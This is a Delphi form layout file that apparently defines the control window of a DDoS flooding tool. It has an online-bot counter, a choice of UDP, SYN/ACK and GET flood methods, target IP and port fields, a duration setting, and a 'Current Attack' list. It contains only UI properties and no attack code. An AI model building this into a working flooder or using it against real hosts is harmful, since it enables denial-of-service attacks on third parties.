object Form3: TForm3
  Left = 0
  Top = 0
  BorderIcons = [biSystemMenu]
  BorderStyle = bsSingle
  ClientHeight = 268
  ClientWidth = 374
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'Tahoma'
  Font.Style = []
  OldCreateOrder = False
  Position = poDesktopCenter
  OnCloseQuery = FormCloseQuery
  PixelsPerInch = 96
  TextHeight = 13
  object sGroupBox1: TsGroupBox
    Left = 8
    Top = 0
    Width = 357
    Height = 137
    Font.Charset = RUSSIAN_CHARSET
    Font.Color = clWindowText
    Font.Height = -11
    Font.Name = 'Times New Roman'
    Font.Style = []
    ParentFont = False
    TabOrder = 0
    object sLabel2: TsLabel
      Left = 56
      Top = 20
      Width = 6
      Height = 14
      Caption = '0'
      ParentFont = False
      Font.Charset = RUSSIAN_CHARSET
      Font.Color = clRed
      Font.Height = -11
      Font.Name = 'Times New Roman'
      Font.Style = []
      UseSkinColor = False
    end
    object sLabel3: TsLabel
      Left = 13
      Top = 20
      Width = 37
      Height = 14
      Caption = 'Online :'
      ParentFont = False
      ParentShowHint = False
      ShowHint = False
      Font.Charset = RUSSIAN_CHARSET
      Font.Color = clBlack
      Font.Height = -11
      Font.Name = 'Times New Roman'
      Font.Style = []
      UseSkinColor = False
    end
    object Label1: TLabel
      Left = 230
      Top = 71
      Width = 21
      Height = 14
      Caption = 'Port'
    end
    object Label2: TLabel
      Left = 13
      Top = 71
      Width = 36
      Height = 14
      Caption = 'IP/Host'
    end
    object Label3: TLabel
      Left = 13
      Top = 44
      Width = 36
      Height = 14
      Caption = 'Method'
    end
    object Label4: TLabel
      Left = 230
      Top = 43
      Width = 19
      Height = 14
      Caption = 'Min'
    end
    object Button1: TButton
      Left = 13
      Top = 96
      Width = 333
      Height = 25
      Caption = 'Send'
      TabOrder = 0
      OnClick = Button1Click
    end
    object Edit2: TEdit
      Left = 52
      Top = 68
      Width = 149
      Height = 22
      TabOrder = 1
      TextHint = '192.168.100.5'
    end
    object Edit3: TEdit
      Left = 257
      Top = 68
      Width = 89
      Height = 22
      TabOrder = 2
      TextHint = '80'
    end
    object ComboBox1: TComboBox
      Left = 52
      Top = 40
      Width = 149
      Height = 22
      Style = csDropDownList
      ItemIndex = 0
      TabOrder = 3
      Text = 'UDP'
      Items.Strings = (
        'UDP'
        'SYN/ACK'
        'GET')
    end
    object ComboBox2: TComboBox
      Left = 257
      Top = 40
      Width = 89
      Height = 22
      Style = csDropDownList
      ItemIndex = 0
      TabOrder = 4
      Text = '1'
      Items.Strings = (
        '1'
        '10'
        '20'
        '30'
        '40'
        '50'
        '60')
    end
  end
  object sGroupBox2: TsGroupBox
    Left = 9
    Top = 143
    Width = 356
    Height = 98
    Caption = 'Current Attack'
    Font.Charset = RUSSIAN_CHARSET
    Font.Color = clWindowText
    Font.Height = -11
    Font.Name = 'Times New Roman'
    Font.Style = []
    ParentFont = False
    TabOrder = 1
    CaptionLayout = clTopCenter
    object ListView1: TListView
      Left = 12
      Top = 21
      Width = 333
      Height = 60
      Columns = <
        item
          Caption = 'IP'
          Width = 80
        end
        item
          Caption = 'PORT'
        end
        item
          Caption = 'METHOD'
          Width = 70
        end
        item
          Caption = 'MIN'
        end
        item
          Caption = 'TIME'
          Width = 60
        end>
      TabOrder = 0
      ViewStyle = vsReport
    end
  end
  object StatusBar1: TStatusBar
    Left = 0
    Top = 249
    Width = 374
    Height = 19
    Panels = <>
    ExplicitLeft = 128
    ExplicitTop = 304
    ExplicitWidth = 0
  end
  object Timer1: TTimer
    Enabled = False
    OnTimer = Timer1Timer
    Left = 17
    Top = 207
  end
end
